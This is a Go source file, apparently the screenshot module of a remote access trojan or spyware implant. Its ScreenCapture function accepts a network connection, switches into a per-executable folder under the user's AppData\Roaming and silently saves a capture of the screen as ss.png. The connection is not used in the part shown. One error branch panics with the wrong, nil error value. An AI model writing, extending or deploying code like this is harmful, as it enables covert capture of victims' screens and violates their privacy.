package snap

import (
	"image/png"
	"net"
	"os"
	"path/filepath"

	"github.com/vova616/screenshot"
)

func ScreenCapture(connection net.Conn) (err error) {

	exe_name := filepath.Base(os.Args[0])
	without_ext := exe_name[:len(exe_name)-len(filepath.Ext(exe_name))]

	home, _ := os.UserHomeDir()
	com := os.Chdir(filepath.Join(home, "AppData\\Roaming", without_ext))
	if com != nil {
		panic(err)
	}

	img, err := screenshot.CaptureScreen()
	if err != nil {
		panic(err)
	}
	f, err := os.Create("./ss.png")
	if err != nil {
		panic(err)
	}
	err = png.Encode(f, img)
	if err != nil {
		panic(err)
	}
	f.Close()
	return

}
